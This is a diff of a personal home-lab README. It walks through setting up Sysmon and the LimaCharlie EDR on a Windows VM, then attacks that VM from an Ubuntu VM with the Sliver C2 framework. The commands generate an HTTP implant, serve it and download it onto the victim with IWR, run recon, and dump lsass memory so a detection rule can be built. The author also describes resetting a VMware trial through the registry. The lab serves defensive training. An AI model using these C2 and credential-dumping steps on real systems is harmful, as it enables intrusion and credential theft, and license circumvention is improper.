@@ -18,12 +18,15 @@ I created a SOC lab again! This time, I used two small vm's (Microsoft 11, and U
 
 - <b>Windows 11</b>
  - <b>Ubuntu Server 64</b>
+ - <b>LimaCharlie EDR</b>
 
 <h2>Lab walk-through:</h2>
 
 <p align="center">
  <b>Setting Up Virtual Machines</b>  </p>
- The initial steps are the easiest. First begin by going to your favorite hypervisor. For today, I used VMware workstation pro. I may have had to go into my personal computer's regedit to find a registry of a forgotten license registry key to reset my trial time- but that is neither here nor there (anymore). It's important to pay attention to the date of when VMware expires. The original lab explains to download a new one after the expiration date, but feel free to ask me for help if you can't use it again. It won't allow you to simply delete, and as mentioned YOU WILL have to pry into your computer's regedit settings to pry it off. I will gladly assist you (it's sneaky).
+ The initial steps are the easiest. First begin by going to your favorite hypervisor. For today, I used VMware workstation pro. ~~I may have had to go into my personal computer's regedit to find a registry of a forgotten license registry key to reset my trial time- but that is neither here nor there (anymore)
+ 
+ It's important to pay attention to the date of when VMware expires. The original lab explains to download a new one after the expiration date, but feel free to ask me for help if you can't use it again. It won't allow you to simply delete, and as mentioned YOU WILL have to pry into your computer's regedit settings to pry it off. I will gladly assist you (it's sneaky).
  
  
  https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html <---- Link to VMware hypervisor
@@ -61,17 +64,17 @@ more info on Sysmon here: https://learn.microsoft.com/en-us/sysinternals/downloa
 
 Launch an administrative powershell and install Sysmon with the following command: 
 
-Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip
+`Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip`
 
 Unzip it : Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon
 
-Download SwiftOnSecurity's Sysmon Config: Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml
+Download SwiftOnSecurity's Sysmon Config: `Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml`
 
-Now install with: C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml
+Now install with: `C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml`
 
-Validate the install with the following command: Get-Service sysmon64
+Validate the install with the following command: `Get-Service sysmon64`
 
-Then check for the presence of Sysmon logs: Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
+Then check for the presence of Sysmon logs: `Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10`
 ^Quick explanation, you are limiting the amount of events to 10, and you are specifying which logs you are looking for. This might be self explanatory but- I always enjoy seeing some explanation of what I am doing and what for. 
 
 Now the next step: Download LimaCharlie EDR from here: https://limacharlie.io/
@@ -81,11 +84,11 @@ Once you have finished up the settings, it will generate an installer key for yo
 
 Make sure you download it FROM your WINDOWS VM. When I first went through this lab I did not do this. It will save you 5-10 minutes (mylaugh). 
 
-Open up admin powershell and run the following command: cd C:\Users\User\Downloads
+Open up admin powershell and run the following command: `cd C:\Users\User\Downloads`
 
-Then run this command: Invoke-WebRequest -Uri https://downloads.limacharlie.io/sensor/windows/64 -Outfile C:\Users\User\Downloads\lc_sensor.exe
+Then run this command: `Invoke-WebRequest -Uri https://downloads.limacharlie.io/sensor/windows/64 -Outfile C:\Users\User\Downloads\lc_sensor.exe`
 
-Now shift into standard command: cmd.exe
+Now shift into standard command: `cmd.exe`
 
 Almost done. Copy the installation command key that LimaCharlie generated for you and paste into your terminal. 
 
@@ -115,77 +118,85 @@ To start, use SSH to log into the attack VM. For this, get into the terminal of 
 That command is going to give you the IP address of the VM which is important. We need it to SSH into it. 
 Open up cmd.exe (I always type it into the lower left search bar of my PC) 
 
-Type: SSH (username)@(ipofVM)
+Type: `SSH (username)@(ipofVM)`
 
 Follow through with the prompts and you are in!
 
-on your VM type: route -n
+on your VM type: `route -n`
 ^This will give us the gateway of the VM^ 
 
-Type this into the vm: sudo nano /etc/netplan/00-installer-config.yaml
+Type this into the vm: `sudo nano /etc/netplan/00-installer-config.yaml`
 
 We are going to reconfigure our adapter from DHCP to a static IP address. I missed this up several times. I kept making errors with indentations, spacing, and placement. If you want to give up on giving it a static IP address; that is completely okay. 
 
-Switching back to the SSH Session; type: sudo su
+Switching back to the SSH Session; type: `sudo su`
 ^We are dropping into the shell to be able to make admin changes. Also we are about to download Sliver_Server link: https://github.com/BishopFox/sliver/wiki
 
 Type in this command on the SSH window: 
 
-# Download Sliver Linux server binary
+`# Download Sliver Linux server binary
 wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux -O /usr/local/bin/sliver-server
 # Make it executable
 chmod +x /usr/local/bin/sliver-server
 # install mingw-w64 for additional capabilities
-apt install -y mingw-w64
+apt install -y mingw-w64`
 
 Now create a new directory using the following command: 
 
 # Create and enter our working directory
-mkdir -p /opt/sliver
+`mkdir -p /opt/sliver`
 
 <b> Launching our Payload </b> 
 
-In the SSH Window launch: sliver-server
+In the SSH Window launch: `sliver-server`
 
-Now generate the first C2 payload: generate --http [Linux_VM_IP] --save /opt/sliver
+Now generate the first C2 payload: `generate --http [Linux_VM_IP] --save /opt/sliver`
 
-Confirm the implant by typing: implants 
+Confirm the implant by typing: `implants `
 
 Once you get a visual confirmation, type in 'exit' to exit Sliver. 
 
 Type in the following 2 commands: 
 
-cd /opt/sliver
-python3 -m http.server 80
+`cd /opt/sliver`
+`python3 -m http.server 80`
 
 Quick explanation: The command python3 -m http.server 80 starts a simple HTTP server on port 80. This means that you can access the current working directory as a web server using your browser. For example, if you have a file called index.html in the current working directory, you can access it by opening http://localhost:80/index.html in your browser.
 
 The -m flag tells Python to run the module http.server as a script. The 80 argument tells the server to listen on port 80.
 
 Switch to the windows VM and launch admin powershell. Type in the following: 
-IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe
+`IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe`
 
 <b> Starting the Command and Control Session </b> 
-Switch back to the Linux VM SSH Session. Terminate the python web server by selecting ctrl+c on the keyboard. 
-Relaunch Sliver, and type http. 
+Switch back to the Linux VM SSH Session. Terminate the python web server by selecting `ctrl+c` on the keyboard. 
+Relaunch Sliver, and type `http`. 
 
-Switch back to the Windows VM and execute the C2 payload from its download location: C:\Users\User\Downloads\(payloadname).exe
+Switch back to the Windows VM and execute the C2 payload from its download location: `C:\Users\User\Downloads\(payloadname).exe`
 
 With this in place, we can now learn about our victim host. 
 
+<a href="https://imgur.com/Xb55kps"><img src="https://i.imgur.com/Xb55kps.png" title="source: imgur.com" /></a>
+
 Type the following commands into sliver: 
-info
-whoami
-getprivs
-pwd
-netstat
-ps -T
+`info`
+`whoami`
+`getprivs`
+`pwd`
+`netstat`
+`ps -T`
 
 <b> Observe EDR Telemetry </b> 
 Take the time to observe your findings and logs. More than anything, get used to the amount of noise the logs make. 
+<a href="https://imgur.com/VGUCpZr"><img src="https://i.imgur.com/VGUCpZr.png" title="source: imgur.com" /></a>
 
 
-MY personal findings and such: It noted that User NT AUTHORITY/SYSTEM was actively listening on the network. Even showed that they were using protocol tcp4 and tcp6. And even I could see the use of the command line and the path of our C2 OUTSTANDING_DISGUISE.exe file took and came from. 
+MY personal findings and such:
+<a href="https://imgur.com/HiT44fn"><img src="https://i.imgur.com/HiT44fn.png" title="source: imgur.com" /></a>
+
+
+
+It noted that User NT AUTHORITY/SYSTEM was actively listening on the network. Even showed that they were using protocol tcp4 and tcp6. And even I could see the use of the command line and the path of our C2 OUTSTANDING_DISGUISE.exe file took and came from. 
 
 Looking through these logs I used the SANS Hunt Evil poster to help me dig through the information and get a better sense of what normal is: [https://sansorg.egnyte.com/dl/oQm41D67D6](https://sansorg.egnyte.com/dl/oQm41D67D6)
 
@@ -201,7 +212,16 @@ PART 2
 
 Nowwwwww, I went back to my Sliver session to do some more haxxor stuff. I dumped the lsass.exe process from memory into the sliver C2 server. This triggered an alert on Lima Charlie, and would allow me to set up/create a rule for the event.
 
+before: <a href="https://imgur.com/v4Tw7K2"><img src="https://i.imgur.com/v4Tw7K2.png" title="source: imgur.com" /></a>
+after: <a href="https://imgur.com/SGuOrED"><img src="https://i.imgur.com/SGuOrED.png" title="source: imgur.com" /></a>
 
+
+Further Tuning: <a href="https://imgur.com/MkAWSyw"><img src="https://i.imgur.com/MkAWSyw.png" title="source: imgur.com" /></a>
+
+
+Confirmation of Tuning: <a href="https://imgur.com/byiXJqF"><img src="https://i.imgur.com/byiXJqF.png" title="source: imgur.com" /></a>
+
+AND WE DID IT! MY FIRST TUNING AND CREATION OF DETECTION AND RESPONSE!!!!
 
 <!--
  ```diff
